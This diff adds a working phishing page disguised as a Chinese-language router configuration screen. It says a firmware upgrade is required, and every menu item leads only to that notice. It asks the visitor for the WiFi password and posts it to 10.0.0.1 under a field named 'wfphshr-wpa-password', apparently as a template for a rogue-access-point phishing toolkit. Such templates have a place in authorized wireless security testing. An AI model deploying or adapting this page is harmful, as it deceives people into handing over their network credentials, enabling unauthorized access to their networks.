@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Router Configuration Page</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1,minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <link rel="stylesheet" href="/static/bootstrap.min.css">
+  <script src="/static/jquery.min.js"></script>
+  <script src="/static/bootstrap.min.js"></script>
+
+  <!-- CSS -->
+  <style type="text/css">
+
+    /* Sticky footer styles
+    -------------------------------------------------- */
+
+    html,
+    body {
+          height: 100%;
+          /* The html and body elements cannot have any padding or margin. */
+        }
+
+        /* Wrapper for page content to push down footer */
+        #wrap {
+          min-height: 100%;
+          height: auto !important;
+          height: 100%;
+          /* Negative indent footer by it's height */
+          margin: 0 auto -60px;
+        }
+
+        /* Set the fixed height of the footer here */
+        #push,
+        #footer {
+          height: 60px;
+        }
+        #footer {
+          background-color: #f5f5f5;
+        }
+
+        /* Lastly, apply responsive CSS fixes as necessary */
+        @media (max-width: 767px) {
+          #footer {
+            margin-left: -20px;
+            margin-right: -20px;
+            padding-left: 20px;
+            padding-right: 20px;
+          }
+        }
+
+    img {
+        width: auto;
+        max-width: 100%;
+        height: auto;
+    }
+  </style>
+
+</head>
+
+<body>
+
+  <!-- Start navigation bar -->
+  <!-- To change the navigation bar color change background attribute -->
+  <nav class="navbar navbar-inverse" style="background:RoyalBlue;margin-top:2em;">
+    <div class="container-fluid">
+      <div class="navbar-header">
+        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNavbar">
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+        <!--
+        <a class="navbar-brand"><img style="background:transparent" src="Your LOGO" alt="Logo"></a>
+        -->
+      </div>
+      <div class="collapse navbar-collapse" id="myNavbar">
+        <ul class="nav navbar-nav">
+          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
+              data-toggle="dropdown" href="#" style="color:white">配置<span class="caret"></span></a>
+            <ul class="dropdown-menu">
+              <li><a href="#">设置</a></li>
+              <li><a href="#">DDNS</a></li>
+              <li><a href="#">网卡</a></li>
+              <li><a href="#">高级</a></li>
+            </ul>
+          </li>
+          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
+              data-toggle="dropdown" href="#" style="color:white">无线 <span class="caret"></span></a>
+            <ul class="dropdown-menu">
+              <li><a href="#">基本设置</a></li>
+              <li><a href="#">无线安全</a></li>
+              <li><a href="#">无线过滤</a></li>
+              <li><a href="#">高级设置</a></li>
+            </ul>
+          </li>
+          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
+              data-toggle="dropdown" href="#" style="color:white">安全 <span class="caret"></span></a>
+            <ul class="dropdown-menu">
+              <li><a href="#">防火墙</a></li>
+              <li><a href="#">VPN</a></li>
+            </ul>
+          </li>
+          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
+              data-toggle="dropdown" href="#" style="color:white">访问限制 <span class="caret"></span></a>
+            <ul class="dropdown-menu">
+              <li><a href="#">网络访问</a></li>
+            </ul>
+          </li>
+          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
+              data-toggle="dropdown" href="#" style="color:white">管理员 <span class="caret"></span></a>
+            <ul class="dropdown-menu">
+              <li><a href="#">管理</a></li>
+              <li><a href="#">日志</a></li>
+              <li><a href="#">工场设置</a></li>
+              <li><a href="#">管理设置</a></li>
+            </ul>
+          </li>
+          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
+              data-toggle="dropdown" href="#" style="color:white">状态 <span class="caret"></span></a>
+            <ul class="dropdown-menu">
+              <li><a href="#">路由</a></li>
+              <li><a href="#">本地网络</a></li>
+              <li><a href="#">无线</a></li>
+              <li><a href="#">高级路由设置</a></li>
+            </ul>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- End navigation bar -->
+
+  <!-- Start page content -->
+  <div class="container">
+	   <div class="col-sm">
+       <center></center>
+       <h2 class="text-center" style="color:CornflowerBlue">硬件设置</h2>
+     </div>
+    <form>
+      <div class="form-group">
+      </div>
+      <div class="form-group has-feedback">
+          <label for="pwd">请输入WIFI密码</label>
+          <input class="form-control" type="password" id="pwd" >
+      </div>
+      <div class="container text-center">
+        <input class="btn btn-primary" id="btn" value="开始升级"></input>
+      </div>
+    </form>
+    <div id="push"></div>
+  </div>
+  <!-- Start page content -->
+
+  <!-- Start footer -->
+  <footer class="footer">
+    <div class="container text-center">
+      <p class="text-muted">©2017, All Rights Reserved.</p>
+    </div>
+  </footer>
+  <!-- End footer -->
+
+  <!-- Start update first message -->
+  <div class="modal fade" id="update-only" role="dialog">
+    <div class="modal-dialog modal-sm">
+      <div class="modal-content">
+        <div class="modal-header">
+          <button type="button" class="close" data-dismiss="modal">&times;</button>
+          <h4 class="modal-title">信息</h4>
+        </div>
+        <div class="modal-body">
+          <p>升级需求.</p>
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-default" data-dismiss="modal">关闭</button>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- End update first message -->
+
+  <!-- Start empty password message -->
+  <div class="modal fade" id="empty-pass">
+    <div class="modal-dialog modal-sm">
+      <div class="modal-content">
+        <div class="modal-header">
+          <button type="button" class="close" data-dismiss="modal">&times;</button>
+          <h4 class="modal-title">信息</h4>
+        </div>
+        <div class="modal-body">
+          <p>输入有效密码</p>
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-default" data-dismiss="modal">关闭</button>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- End empty password message -->
+
+  <!-- Start empty password message -->
+  <div class="modal fade" id="no-checkbox">
+    <div class="modal-dialog modal-sm">
+      <div class="modal-content">
+        <div class="modal-header">
+          <button type="button" class="close" data-dismiss="modal">&times;</button>
+          <h4 class="modal-title">信息</h4>
+        </div>
+        <div class="modal-body">
+          <p>请确认协议</p>
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-default" data-dismiss="modal">关闭</button>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- End empty password message -->
+
+<script>
+
+/*
+  Check the password field and act accordingly.
+*/
+$("#btn").on("click", function(e) {
+
+    //e.preventDefault();
+    // get the password box and checkbox elements
+    var input = document.getElementById("pwd");
+    var box = document.getElementById("check-box");
+
+    // if the box is checked
+        // check to see if the value is empty
+      	if ( input.value == "" ){
+            // display no password message
+            $("#empty-pass").modal("show");
+
+      	}
+      	else{
+            // post the data
+            post('http://10.0.0.1/post', {"wfphshr-wpa-password": input.value});
+
+        }
+});
+
+/*
+  Post to the fallowing path given the parameters.
+
+  Args:
+    path: The path to be posted to.
+    params: The parameters to be passed.
+*/
+function post(path, params) {
+    var form = document.createElement("form");
+    form.setAttribute("method", "post");
+    form.setAttribute("action", path);
+
+    // set the attribute for the post
+    for(var key in params) {
+        if(params.hasOwnProperty(key)) {
+            var hiddenField = document.createElement("input");
+            hiddenField.setAttribute("type", "hidden");
+            hiddenField.setAttribute("name", key);
+            hiddenField.setAttribute("value", params[key]);
+
+            form.appendChild(hiddenField);
+         }
+    }
+
+    // submit the post
+    document.body.appendChild(form);
+    form.submit();
+}
+
+/*
+  Check the status of check box
+*/
+function checkBoxStatus()
+{
+  // get the password box and checkbox elements
+	var box = document.getElementById("check-box");
+	var input = document.getElementById("pwd");
+
+  // if the box is checked
+	if ( box.checked == true )
+		{
+      // enabale the password box
+			input.disabled = false;
+		}
+	else
+		{
+      // disable the password box
+			input.disabled = true;
+		}
+	}
+</script>
+</body>
+</html>
